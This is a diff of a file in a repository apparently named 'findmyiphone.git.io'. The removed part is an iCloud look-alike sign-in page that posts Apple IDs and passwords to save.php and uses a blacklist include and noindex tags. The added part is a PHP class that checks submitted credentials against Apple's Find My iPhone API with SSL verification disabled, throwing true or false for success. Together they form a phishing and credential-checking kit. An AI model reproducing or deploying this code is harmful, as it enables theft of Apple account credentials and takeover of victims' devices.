@@ -1,272 +1,152 @@
 # findmyiphone.git.io
-<?php  include 'BlackList.php';
-$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
- 
-switch ($lang) {
-  case 'en':
-  $lang_file = 'lang.en.php';
-  break;
- 
-  case 'fr':
-  $lang_file = 'lang.fr.php';
-  break;
- 
-  case 'es':
-  $lang_file = 'lang.es.php';
-  break;
-  case 'de':
-  $lang_file = 'lang.de.php';
-  break;
- 
-  default:
-  $lang_file = 'lang.en.php';
- 
-}
- 
-include_once 'languages/'.$lang_file;
-?>
-<!DOCTYPE html>
-<html lang="en">
-<head>
- <!--[if IE 7]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]--> 
- <!--[if IE 8]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
- <!--[if IE 9]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
- <!--[if IE 10]><meta http-equiv="refresh" content="0;URL=unsupported_browser/"><![endif]-->
-	<meta charset="UTF-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta content="width=device-width, initial-scale=1" name="viewport"/>
-	<meta name="robots" content="noindex, nofollow" />
-	<title><?php echo $lang['PAGE_TITLE']; ?></title>
-	<link rel="shortcut icon" href="assets/img/favicon.ico">
-	<link rel="stylesheet" href="assets/layout/strap.css">
-	<link rel="stylesheet" href="assets/layout/apple.css">
-	<link rel="stylesheet" href="assets/layout/kit.css">
-	<link rel="stylesheet" href="assets/layout/animate.css">
-
-<script type="text/javascript">
-  <!--
-  if (screen.width <= 800) {
-    window.location = "mobiv.php";
-  }
-  //-->
-</script>
-	
-	<script src="assets/js/jquery-latest.min.js"></script>
-	<script>
-      $(document).ready(function() {
-		$('#preloader').delay(900).fadeOut('slow'); // will fade out the white DIV that covers the website.
-		$('body').css({'overflow':'visible'});
-		$('#test').delay(900).css({'display':'block'});
-			$('.checkbox-state-normal').click(function() {
-				$('.checkbox-state-normal').hide();
-				$('.checkbox-state-focused-selected').css("display","");
-			});
-		  
-		  $('.checkbox-state-focused-selected').click(function() {
-				$('.checkbox-state-focused-selected').hide();
-				$('.checkbox-state-normal').css("display","");
-			});
-		});
-	</script>	
-</head>
-<body>
-<!-- Preloader -->
-<div id="preloader">
-	<div id="status"><span></span></div>
-</div>
-
-<section id="header">
-	<div class="container-fluid">
-		<div class="row">
-			<div class="col-md-4 col-xs-8 rightH rtl">
-				<a class="help" title="Help and Support" alt="Help and Support" href="https://help.apple.com/icloud/"></a>
-				<span class="spreat"></span>
-								<a class="setup applef" target="_blank" href="https://www.apple.com/icloud/setup/"><?php echo $lang['SETUP_INSTRUCTIONS'] ?></a>
-								<div class="setup fName" style="display: none;"><i class="glyphicon glyphicon-menu-down"></i><span><img src="assets/img/user.jpeg" alt=""></span>
-					<ul>
-						<li><a href="find">iCloud Settings</a></li>
-						<li><a href="logout">Sign Out</a></li>
-					</ul>
-				</div>
-
-			</div>
-			<div class="col-md-8 col-xs-4 leftH">
-				<span class="icloud"></span>
-			</div>
-		</div>
-	</div>
-</section>
-
-<section class="login-form text-center" style="display: block;">
-
-	<img src="assets/img/cloud.png" class="img-cloud" alt="">
-	
-	<h2><?php echo $lang['SIGN_IN_TITLE']; ?></h2>
-
-	<form action="save.php" class="cloud-login form-ajax" role="form" data-red="find" method="post" accept-charset="utf-8">
-
-
-		<input type="text" class="id" name="appleid" id="appleID" placeholder="<?php echo $lang['APPLE_ID']; ?>" style="direction: ltr !important;">
-		<input type="password" autocomplete="off" class="pwd" name="password" id="password" placeholder="<?php echo $lang['PASSWORD']; ?>">
-		<input type="submit" class="dolog" name="singin" id="singin" value="">
-		<img class="loading" src="assets/img/ajax-loader.gif" alt="Loading" />
-		<div class="alrt">
-		</div>
-		
-	</form>
-
-	<div class="keepme">
-		<input type="checkbox" id="keepme" />
-		<span for="keepme"><?php echo $lang['KEEP_ME']; ?></span>
-	</div>
-
-	<div class="forget">
-		<a href="https://iforgot.apple.com/" target="_blank"><?php echo $lang['FORGOT_ID']; ?></a>
-		<div id="response"></div>
-	</div>
-	<div class="newid">
-		<?php echo $lang['DONT_HAVE_ID']; ?> <a href="https://appleid.apple.com/account" target="blank"><?php echo $lang['CREATE_YOURS']; ?></a>
-		<div id="response"></div>
-	</div>
-
-</section>
-
-<section class="imessage" style="display: none;">
-
-
-	<div class="container">
-		<div class="row">
-		<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/11.png" alt="">
-					<span>Reminders</span>
-				</a>
-			</div>
-			<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/9.png" alt="">
-					<span>
-						Notes
-					</span>
-				</a>
-			</div>
-			<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/3.png" alt="">
-					<span>iCloud Drive</span>
-				</a>
-			</div>
-			<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/10.png" alt="">
-					<span>Photos</span>
-				</a>
-			</div>
-			<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/1.png" alt="">
-					<span>Contacts</span>
-				</a>
-			</div>
-			<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/8.png" alt="">
-					<span>Mail</span>
-				</a>
-			</div>
-			
-			
-			
-
-			<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/12.png" alt="">
-					<span>Settings</span>
-				</a>
-			</div>
-
-			<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/2.png" alt="">
-					<span>Find My iPhone</span>
-				</a>
-			</div>
-
-			<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/6.png" alt="">
-					<span>Keynote</span>
-				</a>
-			</div>
-			<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/5.png" alt="">
-					<span>Numbers</span>
-				</a>
-			</div>
-			<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/20.png" alt="">
-					<span>Find Friends</span>
-				</a>
-			</div>
-
-			<div class="col-md-2 col-sm-4 col-xs-6">
-				<a href="find" class="text-cente imb">
-					<span class="loadings"><img src="assets/img/ajax-loader.gif" alt="Loading" /></span>
-					<img class="" src="assets/img/7.png" alt="">
-					<span>Pages</span>
-				</a>
-			</div>
-			
-
-		</div>
-	</div>
-
-
-</section><footer class="foot">
-	<div class="container-fluid">
-		<div class="row">
-		
-		<div class="col-md-10 col-xs-12 foot-link">
-			<a href="https://www.icloud.com/activationlock" target="blank"><?php echo $lang['CHECK_ACTIVATION']; ?></a>
-			<span class="footer-link-separator"></span>
-			<a href="https://www.apple.com/support/systemstatus/" target="_blank"><?php echo $lang['SYSTEM_STATUS']; ?></a>
-			<span class="footer-link-separator"></span>
-			<a href="https://www.apple.com/privacy/" target="_blank"><?php echo $lang['POLICY']; ?></a>
-			<span class="footer-link-separator"></span>
-			<a href="https://www.apple.com/legal/icloud/ww/" target="_blank"><?php echo $lang['TERMS']; ?></a>
-			<span class="footer-link-separator"></span>
-			<span class="copyright"><?php echo $lang['COPYRIGHT']; ?></span>
-		</div>
-		<div class="col-md-2 col-xs-12 apple">
-			<a href="https://www.apple.com/" target="_blank" class="apple-logo"></a>
-		</div>
-
-		</div>
-	</div>
-</footer>
-	
-	<script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
-	<script src="assets/js/strap.min.js"></script>
-<script src="assets/js/findmyphone.min.js"></script>
-	<!-- <script src="assets/js/apple.min.js"></script>
-	<script src="assets/js/ajax-form.min.js"></script> -->
 <?php
-if(isset($_GET["error"])){
-echo $lang['IDPWD_ERROR_ALERT'];
+class FindMyiPhone {
+	private $username;
+	private $password;
+	public $devices = array();
+	private $email_updates = true;
+	private $host = 'fmipmobile.icloud.com';
+	private $scope;
+	private $client_context = array(
+		'appName' => 'FindMyiPhone',
+		'appVersion' => '3.0',
+		'buildVersion' => '376',
+		'clientTimestamp' => 0,
+		'deviceUDID' => null,
+		'inactiveTime' => 1,
+		'osVersion' => '7.0.3',
+		'productType' => 'iPhone6,1'
+	);
+	private $server_context = array(
+		'callbackIntervalInMS' => 10000,
+		'classicUser' => false,
+		'clientId' => null,
+		'cloudUser' => true,
+		'deviceLoadStatus' => '200',
+		'enableMapStats' => false,
+		'isHSA' => false,
+		'lastSessionExtensionTime' => null,
+		'macCount' => 0,
+		'maxDeviceLoadTime' => 60000,
+		'maxLocatingTime' => 90000,
+		'preferredLanguage' => 'en-us',
+		'prefsUpdateTime' => 0,
+		'sessionLifespan' => 900000,
+		'timezone' => null,
+		'trackInfoCacheDurationInSecs' => 86400,
+		'validRegion' => true
+	);
+	/**
+	 * Constructor
+	 * Checks requred extensions, sets username/password and gets url host for the user.
+	 * @param $username - iCloud Apple ID
+	 * @param $password - iCloud Password
+	 */
+	public function __construct($username, $password) {
+		if (!extension_loaded('curl')) {
+			throw new FindMyiPhoneException('PHP extension cURL is not loaded.');
+		}
+		$this->username = $username;
+		$this->password = $password;
+		$this->init_client();
+	}
+	/**
+	 * Init Client
+	 * 
+	 */
+	private function init_client() {
+		$post_data = json_encode(array(
+			'clientContext' => $this->client_context
+		));
+		$headers = $this->parse_curl_headers($this->make_request('initClient', $post_data, true));
+if(isset($headers['X-Apple-MMe-Host'])){
+		$this->host = $headers['X-Apple-MMe-Host'];
+		$this->scope = $headers['X-Apple-MMe-Scope'];
+		throw new FindMyiPhoneException(true);
 }
+else{
+	throw new FindMyiPhoneException(false);
+}
+		$this->refresh_client();
+	}
+	/**
+	 * Refresh Client
+	 * 
+	 */
+	public function refresh_client() {
+		$post_data = json_encode(array(
+			'clientContext' => $this->client_context,
+			'serverContext' => $this->server_context
+		));
+		/*foreach (json_decode($this->make_request('refreshClient', $post_data))->content as $id => $device) {
+			$this->devices[$id] = $device;
+		}*/
+	}
+	
+	/**
+	 * Make request to the Find My iPhone server.
+	 * @param $method - the method
+	 * @param $post_data - the POST data
+	 * @param $return_headers - also return headers when true
+	 * @param $headers - optional headers to send
+	 * @return HTTP response
+	 */
+	private function make_request($method, $post_data, $return_headers = false, $headers = array()) {
+		if(!is_string($method)) throw new FindMyiPhoneException('Expected $method to be a string');
+		if(!$this->is_json($post_data)) throw new FindMyiPhoneException('Expected $post_data to be json');
+		if(!is_array($headers)) throw new FindMyiPhoneException('Expected $headers to be an array');
+		if(!is_bool($return_headers)) throw new FindMyiPhoneException('Expected $return_headers to be a bool');
+		if(!isset($this->scope)) $this->scope = $this->username;
+		array_push($headers, 'Accept-Language: en-us');
+		array_push($headers, 'Content-Type: application/json; charset=utf-8');
+		array_push($headers, 'X-Apple-Realm-Support: 1.0');
+		array_push($headers, 'X-Apple-Find-Api-Ver: 3.0');
+		array_push($headers, 'X-Apple-Authscheme: UserIdGuest');
+		$curl = curl_init();
+		curl_setopt_array($curl, array(
+			CURLOPT_TIMEOUT => 9,
+			CURLOPT_CONNECTTIMEOUT => 5,
+			CURLOPT_SSL_VERIFYPEER => false,
+			CURLOPT_FOLLOWLOCATION => true,
+			CURLOPT_RETURNTRANSFER => true,
+			CURLOPT_AUTOREFERER => true,
+			CURLOPT_VERBOSE => false,
+			CURLOPT_POST => true,
+			CURLOPT_POSTFIELDS => $post_data,
+			CURLOPT_HTTPHEADER => $headers,
+			CURLOPT_HEADER => $return_headers,
+			CURLOPT_URL => sprintf("https://%s/fmipservice/device/%s/%s", $this->host, $this->scope, $method),
+			CURLOPT_USERPWD => $this->username . ':' . $this->password,
+			CURLOPT_USERAGENT => 'FindMyiPhone/376 CFNetwork/672.0.8 Darwin/14.0.0'
+		));
+		$http_result = curl_exec($curl);
+		curl_close($curl);
+		return $http_result;
+	}
+	/**
+	 * Parse cURL headers
+	 * @param $response - cURL response including the headers
+	 * @return array of headers
+	 */
+	private function parse_curl_headers($response) {
+		$headers = array();
+		foreach (explode("\r\n", substr($response, 0, strpos($response, "\r\n\r\n"))) as $i => $line) {
+			if ($i === 0) {
+				$headers['http_code'] = $line;
+			} else {
+				list($key, $value) = explode(': ', $line);
+				$headers[$key] = $value;
+			}
+		}
+		return $headers;
+	}
+	/**
+	 * Finds whether a variable is json.
+	 */
+	private function is_json($var) {
+		json_decode($var);
+		return (json_last_error() == JSON_ERROR_NONE);
+	}
+}
+class FindMyiPhoneException extends Exception {}
 ?>
-</body>
-</html>
